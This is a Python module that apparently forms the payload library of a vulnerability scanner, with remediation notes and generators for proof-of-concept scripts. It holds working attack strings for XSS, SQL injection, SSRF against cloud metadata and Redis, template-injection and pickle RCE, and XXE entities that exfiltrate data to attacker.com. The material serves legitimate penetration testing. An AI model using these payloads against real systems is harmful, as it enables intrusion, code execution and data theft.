"""Vulnerability payload library extracted from Strix skills.

These are the actual attack payloads and detection techniques from Strix's
vulnerability skill files. Each category includes:
- Detection patterns (what to look for in source code)
- Test payloads (what to inject to confirm the vulnerability)
- Validation criteria (how to confirm the finding is real)
- Remediation (how to fix it)
"""

from dataclasses import dataclass, field


@dataclass
class Payload:
    """A specific attack payload with context."""

    name: str
    payload: str
    context: str  # where to inject (HTML, JS string, attribute, etc.)
    description: str = ""
    detection_method: str = ""  # error-based, boolean-blind, time-based, oob


@dataclass
class VulnerabilityPattern:
    """Complete vulnerability pattern with payloads and detection."""

    name: str
    cwe: str
    owasp: str
    stride: list[str]  # S, T, R, I, D, E
    severity: str
    description: str
    detection_patterns: list[str] = field(default_factory=list)
    payloads: list[Payload] = field(default_factory=list)
    validation_steps: list[str] = field(default_factory=list)
    remediation: str = ""
    framework_specific: dict[str, str] = field(default_factory=dict)


# ============================================================================
# XSS VULNERABILITY PATTERNS (from Strix xss.md)
# ============================================================================

XSS = VulnerabilityPattern(
    name="Cross-Site Scripting (XSS)",
    cwe="CWE-79",
    owasp="A03:2021-Injection",
    stride=["T", "I"],
    severity="high",
    description="Injection of malicious scripts into web pages viewed by other users",
    detection_patterns=[
        "innerHTML", "outerHTML", "insertAdjacentHTML",
        "dangerouslySetInnerHTML", "v-html", "{{{", "@html",
        "document.write", "eval(", "setTimeout(", "setInterval(",
        "location.hash", "location.search", "document.referrer",
        "postMessage", "window.name",
    ],
    payloads=[
        Payload("HTML node", "<svg onload=alert(1)>", "HTML text context",
                "Classic SVG-based XSS", "DOM inspection"),
        Payload("Attribute quoted", '" autofocus onfocus=alert(1) x="',
                "Attribute value context", "Break out of quoted attribute", "DOM inspection"),
        Payload("JS string", '"-alert(1)-"', "JavaScript string context",
                "Break out of JS string", "DOM inspection"),
        Payload("JS template literal", "${alert(1)}", "Template literal context",
                "Expression injection in template literals", "DOM inspection"),
        Payload("Event handler", '" onmouseover=alert(1) x="', "Attribute context",
                "Inject event handler", "DOM inspection"),
        Payload("URL context", "javascript:alert(1)", "href/src context",
                "JavaScript URI scheme", "Navigation intercept"),
        Payload("SVG polyglot",
                '<svg/onload=alert(1)//', "HTML context",
                "Polyglot that works in multiple contexts", "DOM inspection"),
        Payload("IMG error", '<img src=x onerror=alert(1)>', "HTML context",
                "Image error handler XSS", "DOM inspection"),
    ],
    validation_steps=[
        "Provide minimal payload and context (sink type) with before/after DOM evidence",
        "Demonstrate cross-browser execution",
        "Show bypass of stated defenses (CSP, encoding, etc.)",
    ],
    remediation="Encode output for context, use CSP headers, validate/sanitize input",
    framework_specific={
        "react": "Avoid dangerouslySetInnerHTML; use JSX text content",
        "vue": "Avoid v-html; use text interpolation {{ }}",
        "angular": "Avoid [innerHTML]; use DomSanitizer.bypassSecurityTrust only with trusted content",
        "svelte": "Avoid {@html}; use {text} for user content",
        "jinja2": "Use |e filter for HTML escaping",
        "ejs": "Use <%- content %> for escaped output",
    },
)

# ============================================================================
# SQL INJECTION PATTERNS (from Strix sql_injection.md)
# ============================================================================

SQLI = VulnerabilityPattern(
    name="SQL Injection",
    cwe="CWE-89",
    owasp="A03:2021-Injection",
    stride=["T"],
    severity="critical",
    description="Injection of SQL code via user input",
    detection_patterns=[
        "f\".*SELECT.*WHERE", "f'.*SELECT.*WHERE",
        "\\.format.*SELECT", "% .*SELECT",
        "cursor.execute", "db.execute",
        "query =", "raw(", "extra(",
        "whereRaw", "orderByRaw", "raw(",
    ],
    payloads=[
        Payload("Error-based MySQL", "' OR '1'='1' OR SLEEP(5)--",
                "Any input field", "Error-based + time-based blind", "time-based"),
        Payload("Error-based PostgreSQL", "'; SELECT pg_sleep(5)--",
                "Any input field", "PostgreSQL time-based blind", "time-based"),
        Payload("Boolean-blind", "' AND 1=1--", "Any input field",
                "Boolean condition to detect injection", "boolean-blind"),
        Payload("Union SELECT", "' UNION SELECT NULL,NULL--", "Any input field",
                "Union-based data extraction", "union-based"),
        Payload("Stacked queries", "'; SELECT * FROM users--", "Any input field",
                "Multiple statements (DBMS-dependent)", "stacked-queries"),
        Payload("Bypass WAF", "' /*!50000OR*/ 1=1--", "Any input field",
                "Comment-based WAF bypass", "waf-bypass"),
        Payload("Time-based MSSQL", "'; WAITFOR DELAY '0:0:5'--", "Any input field",
                "MSSQL time-based blind", "time-based"),
    ],
    validation_steps=[
        "Error-based: trigger database error message in response",
        "Boolean-blind: compare response length/content for true vs false conditions",
        "Time-based: measure response time delay (>=5s indicates success)",
        "OOB: receive DNS/HTTP callback from target",
    ],
    remediation="Use parameterized queries (prepared statements) for all database interactions",
    framework_specific={
        "django": "Use ORM queries or parameterized SQL, never f-strings in QuerySet",
        "flask-sqlalchemy": "Use db.session.execute(text(), params), never string formatting",
        "fastapi": "Use SQLAlchemy with bound parameters",
        "raw-sqlite3": "Use cursor.execute(sql, (param1, param2))",
    },
)

# ============================================================================
# SSRF PATTERNS (from Strix ssrf.md)
# ============================================================================

SSRF = VulnerabilityPattern(
    name="Server-Side Request Forgery (SSRF)",
    cwe="CWE-918",
    owasp="A10:2021-Server-Side Request Forgery",
    stride=["T", "I"],
    severity="high",
    description="Server makes requests to attacker-controlled URLs",
    detection_patterns=[
        "requests.get(", "requests.post(", "httpx.get(",
        "urllib.request.urlopen", "aiohttp.get(",
        "fetch(", "curl", "wget",
        "url =", "target_url", "proxy",
    ],
    payloads=[
        Payload("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/",
                "URL parameter", "AWS instance metadata", "oob"),
        Payload("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/",
                "URL parameter", "GCP metadata (needs Metadata-Flavor header)", "oob"),
        Payload("Azure metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "URL parameter", "Azure instance metadata (needs Metadata header)", "oob"),
        Payload("file:// protocol", "file:///etc/passwd",
                "URL parameter", "Local file disclosure via file:// protocol", "response"),
        Payload("gopher:// Redis", "gopher://127.0.0.1:6379/_SET%20pwned%20true",
                "URL parameter", "Redis command injection via gopher://", "oob"),
        Payload("DNS rebinding", "http://rebind.attacker.com/",
                "URL parameter", "DNS rebinding to bypass SSRF filters", "oob"),
        Payload("Decimal IP", "http://2130706433/",
                "URL parameter", "Decimal IP encoding to bypass filters", "response"),
        Payload("Hex IP", "http://0x7f000001/",
                "URL parameter", "Hex IP encoding to bypass filters", "response"),
    ],
    validation_steps=[
        "OOB: receive DNS/HTTP callback from target via interactsh",
        "Response-based: observe response content differences",
        "Blind: use time-based or DNS-based detection",
    ],
    remediation="Validate and allowlist URLs, reject private/internal IPs, use network segmentation",
)

# ============================================================================
# IDOR PATTERNS (from Strix idor.md)
# ============================================================================

IDOR = VulnerabilityPattern(
    name="Insecure Direct Object Reference (IDOR)",
    cwe="CWE-639",
    owasp="A01:2021-Broken Access Control",
    stride=["E"],
    severity="high",
    description="Unauthorized access to objects by manipulating identifiers",
    detection_patterns=[
        "id=", "user_id=", "account_id=", "order_id=",
        "/api/", "/users/", "/accounts/", "/orders/",
        "request.args.get", "request.json",
    ],
    payloads=[
        Payload("ID swap", "Change ID from own to another user's ID",
                "URL parameter or body", "Direct ID manipulation", "response-diff"),
        Payload("UUID decode", "base64_decode(VXNlcjo0NTY=)",
                "GraphQL node ID", "Base64-encoded object reference", "response"),
        Payload("Batch operations", "id=1&id=2",
                "Query parameter", "Parameter pollution to access multiple objects", "response"),
        Payload("Sequential IDs", "Try adjacent IDs (±1, ±10)",
                "URL parameter", "Brute-force sequential identifiers", "response-diff"),
    ],
    validation_steps=[
        "Swap object IDs between two authenticated users",
        "Verify response differs (status, body, headers)",
        "Check batch operations for cross-user data leakage",
        "Test GraphQL node ID decoding",
    ],
    remediation="Implement object-level authorization, use indirect references, validate ownership",
)

# ============================================================================
# CSRF PATTERNS (from Strix csrf.md)
# ============================================================================

CSRF = VulnerabilityPattern(
    name="Cross-Site Request Forgery (CSRF)",
    cwe="CWE-352",
    owasp="A01:2021-Broken Access Control",
    stride=["T", "S"],
    severity="medium",
    description="Unauthorized state-changing actions via victim's browser",
    detection_patterns=[
        "POST", "PUT", "DELETE",
        "sameSite", "csrf", "token",
        "Origin", "Referer",
    ],
    payloads=[
        Payload("Form-based CSRF",
                '<form method="POST" action="http://target/api/transfer"><input name="amount" value="1000"></form><script>document.forms[0].submit()</script>',
                "HTML body", "Auto-submitting form", "browser"),
        Payload("Preflightless POST",
                '<form enctype="text/plain" method="POST" action="http://target/api/transfer">',
                "HTML body", "Bypass preflight with text/plain", "browser"),
        Payload("Login CSRF",
                '<form method="POST" action="/login"><input name="username" value="attacker"></form>',
                "HTML body", "Force victim to log into attacker's account", "browser"),
    ],
    validation_steps=[
        "Create PoC HTML page that triggers the action",
        "Verify action executes when victim visits the page",
        "Confirm no CSRF token or SameSite cookie protection",
    ],
    remediation="Implement CSRF tokens, use SameSite cookies, verify Origin/Referer headers",
)

# ============================================================================
# SSTI PATTERNS (from Strix ssti.md)
# ============================================================================

SSTI = VulnerabilityPattern(
    name="Server-Side Template Injection (SSTI)",
    cwe="CWE-1336",
    owasp="A03:2021-Injection",
    stride=["T", "I"],
    severity="critical",
    description="Injection of template code that executes on the server",
    detection_patterns=[
        "render_template_string", "render_template", "Template(",
        "format_string", "f\"", ".format(",
        "Jinja2", "Mako", "Tornado", "Django",
    ],
    payloads=[
        Payload("Jinja2 detection", "{{7*7}}", "Template input",
                "Math expression to detect template engine", "response"),
        Payload("Jinja2 RCE",
                "{{cycler.__init__.__globals__['os'].popen('id').read()}}",
                "Template input", "RCE via Jinja2 globals", "response"),
        Payload("Velocity detection", "${7*7}", "Template input",
                "Math expression for Velocity/Freemarker", "response"),
        Payload("SpEL RCE", "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "Template input", "RCE via Spring Expression Language", "response"),
        Payload("ERB detection", "<%= 7*7 %>", "Template input",
                "Math expression for ERB/EJS", "response"),
        Payload("Freemarker RCE",
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                "Template input", "RCE via Freemarker", "response"),
    ],
    validation_steps=[
        "Engine fingerprinting: inject math expression, check result",
        "If template engine detected, attempt RCE",
        "Verify output contains command execution result",
    ],
    remediation="Use sandboxed templates, never pass user input to template strings",
)

# ============================================================================
# XXE PATTERNS (from Strix xxe.md)
# ============================================================================

XXE = VulnerabilityPattern(
    name="XML External Entity (XXE)",
    cwe="CWE-611",
    owasp="A05:2021-Security Misconfiguration",
    stride=["T", "I"],
    severity="critical",
    description="XML parser processes external entities, enabling file disclosure and SSRF",
    detection_patterns=[
        "xml.etree", "lxml", "xml.dom", "xml.sax",
        "parseString", "fromstring", "parse(",
        "XMLParser", "defusedxml",
    ],
    payloads=[
        Payload("Basic XXE",
                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                "XML body", "File disclosure via external entity", "response"),
        Payload("Parameter entity",
                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
                "XML body", "OOB XXE via parameter entities", "oob"),
        Payload("XInclude",
                '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
                "XML body", "XInclude injection", "response"),
        Payload("Blind XXE",
                '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://attacker.com/dtd?data=%26exfil;">%xxe;]>',
                "XML body", "Blind XXE with OOB data exfiltration", "oob"),
    ],
    validation_steps=[
        "Inject entity reference, check if file content appears in response",
        "For blind XXE, set up OAST listener and verify callback",
        "Test XInclude as alternative injection vector",
    ],
    remediation="Disable external entity processing, use defusedxml library",
)

# ============================================================================
# RCE PATTERNS (from Strix rce.md)
# ============================================================================

RCE = VulnerabilityPattern(
    name="Remote Code Execution (RCE)",
    cwe="CWE-94",
    owasp="A03:2021-Injection",
    stride=["T", "I", "E"],
    severity="critical",
    description="Attacker can execute arbitrary code on the server",
    detection_patterns=[
        "eval(", "exec(", "os.system(", "os.popen(",
        "subprocess.run(", "subprocess.Popen(",
        "pickle.load(", "yaml.load(",
        "render_template_string", "format_string",
    ],
    payloads=[
        Payload("OS command (Linux)", "; id #", "Command input",
                "Linux command injection", "response"),
        Payload("OS command (blind)", "; sleep 5 #", "Command input",
                "Time-based blind RCE", "time-based"),
        Payload("Python exec", "__import__('os').popen('id').read()",
                "Python eval context", "Python code execution", "response"),
        Payload("Pickle RCE",
                "import pickle, os\nclass Exploit:\n  def __reduce__(self): return (os.system, ('id',))",
                "Deserialization context", "Arbitrary code via pickle", "response"),
    ],
    validation_steps=[
        "Response-based: command output appears in response",
        "Time-based: measure response delay",
        "OOB: receive callback from target",
    ],
    remediation="Never pass user input to exec/eval/subprocess with shell=True",
)


# ============================================================================
# PAYLOAD REGISTRY
# ============================================================================

ALL_VULNERABILITIES = {
    "xss": XSS,
    "sql_injection": SQLI,
    "ssrf": SSRF,
    "idor": IDOR,
    "csrf": CSRF,
    "ssti": SSTI,
    "xxe": XXE,
    "rce": RCE,
}

# CWE to STRIDE mapping (from Strix)
CWE_TO_STRIDE = {
    "79": ["T", "I"],       # XSS → Tampering + Info disclosure
    "89": ["T"],            # SQLi → Tampering
    "94": ["T", "I", "E"],  # RCE → Tampering + Info disclosure + Elevation
    "22": ["T", "I"],       # Path traversal → Tampering + Info disclosure
    "78": ["T", "I"],       # OS Command injection → Tampering + Info disclosure
    "287": ["S", "E"],      # Improper authentication → Spoofing + Elevation
    "352": ["T", "S"],      # CSRF → Tampering + Spoofing
    "502": ["T", "I"],      # Deserialization → Tampering + Info disclosure
    "611": ["T", "I"],      # XXE → Tampering + Info disclosure
    "639": ["E"],           # IDOR → Elevation of privilege
    "798": ["S"],           # Hardcoded credentials → Spoofing
    "918": ["T", "I"],      # SSRF → Tampering + Info disclosure
    "1336": ["T", "I"],     # SSTI → Tampering + Info disclosure
    "347": ["S"],           # Improper JWT verification → Spoofing
    "521": ["S"],           # Weak password requirements → Spoofing
    "601": ["T", "S"],      # Open redirect → Tampering + Spoofing
    "917": ["T", "I"],      # Expression language injection → Tampering + Info disclosure
    "116": ["T", "I"],      # Improper encoding → Tampering + Info disclosure
    "190": ["I"],           # Integer overflow → Info disclosure
    "400": ["I"],           # Bad request → Info disclosure
    "434": ["T", "I"],      # Unrestricted upload → Tampering + Info disclosure
    "476": ["I"],           # NULL pointer dereference → Info disclosure
    "681": ["I"],           # Incorrect conversion → Info disclosure
    "776": ["I"],           # Unrestricted file access → Info disclosure
    "862": ["E"],           # Missing authorization → Elevation
    "863": ["E"],           # Incorrect authorization → Elevation
    "939": ["E"],           # Authorization bypass → Elevation
    "1272": ["S"],          # Sensitive data in memory → Spoofing
    "1284": ["I"],          # Improper input validation → Info disclosure
    "1385": ["I"],          # Missing origin validation → Info disclosure
}


def get_stride_tags(cwe_id: str) -> list[str]:
    """Get STRIDE threat tags for a CWE ID."""
    # Normalize CWE ID
    normalized = cwe_id.upper().replace("CWE-", "").strip()
    return CWE_TO_STRIDE.get(normalized, [])


def get_stride_description(tag: str) -> str:
    """Get description for a STRIDE tag."""
    descriptions = {
        "S": "Spoofing — Impersonation of something/someone",
        "T": "Tampering — Modification of data",
        "R": "Repudiation — Denying actions without way to prove otherwise",
        "I": "Information disclosure — Exposing data to unauthorized entities",
        "D": "Denial of service — Denying service to valid users",
        "E": "Elevation of privilege — Gaining capabilities without authorization",
    }
    return descriptions.get(tag, "Unknown")


# ============================================================================
# PAYLOAD GENERATOR (for evidence generation)
# ============================================================================

def generate_xss_evidence(endpoint: str, param: str) -> str:
    """Generate XSS proof-of-concept code."""
    return f"""# XSS Proof of Concept
import requests

target = "{endpoint}"
payload = '<svg onload=alert(document.domain)>'

# Inject via {param}
response = requests.get(target, params={{"{param}": payload}})

# Check if payload is reflected
if '<svg onload=' in response.text:
    print("VULNERABLE: XSS confirmed")
    print(f"Response contains: {{payload}}")
else:
    print("Payload not reflected")
"""


def generate_sqli_evidence(endpoint: str, param: str) -> str:
    """Generate SQL injection proof-of-concept code."""
    return f"""# SQL Injection Proof of Concept
import requests
import time

target = "{endpoint}"

# Test 1: Error-based
payload_error = "' OR '1'='1"
r1 = requests.get(target, params={{"{param}": payload_error}})
if "error" in r1.text.lower() or "syntax" in r1.text.lower():
    print("VULNERABLE: Error-based SQLi confirmed")

# Test 2: Time-based blind
payload_time = "' OR SLEEP(5)--"
start = time.time()
requests.get(target, params={{"{param}": payload_time}})
elapsed = time.time() - start
if elapsed >= 5:
    print("VULNERABLE: Time-based blind SQLi confirmed")
"""


def generate_ssrf_evidence(endpoint: str, param: str) -> str:
    """Generate SSRF proof-of-concept code."""
    return f"""# SSRF Proof of Concept
import requests

target = "{endpoint}"

# Test AWS metadata
payload = "http://169.254.169.254/latest/meta-data/"
response = requests.get(target, params={{"{param}": payload}})

if "ami-id" in response.text or "instance-id" in response.text:
    print("VULNERABLE: SSRF to AWS metadata confirmed")
    print(f"Metadata: {{response.text[:200]}}")
else:
    print("AWS metadata not accessible via this endpoint")
"""
